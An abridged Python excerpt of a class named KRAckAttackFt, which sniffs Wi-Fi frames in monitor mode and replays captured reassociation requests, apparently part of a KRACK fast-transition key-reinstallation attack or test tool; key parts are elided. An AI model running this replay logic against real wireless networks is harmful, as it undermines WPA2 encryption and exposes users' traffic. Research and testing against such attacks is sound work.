...
class KRAckAttackFt():
	...
	def handle_pkt(self,pkt):
		if pkt and pkt.haslayer(Dot11):
			dot11 = pkt.getlayer(Dot11)
			if dot11.type == 0 and dot11.subtype==2:
				print("REASSO REQ",pkt.summary())
				self.reset_client()
				self.start_replay(pkt)
			elif dot11.type==0 and dot11.subtype==3:
				print("REASSO RESP",pkt.summary())
	...
	def start_replay(self, p):
		...
		while True:
			if time.time() > self.next_replay:
				print("Replaying Reassociation Request: ",self.reassoc)
	...
	def configure_interfaces(self):
		...
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ip", "link", "set", self.nic_mon, "up"])
	...
	def run(self):
		...
		while True:
			sniff(iface=self.nic_mon, prn=lambda x: self.handle_pkt(x))
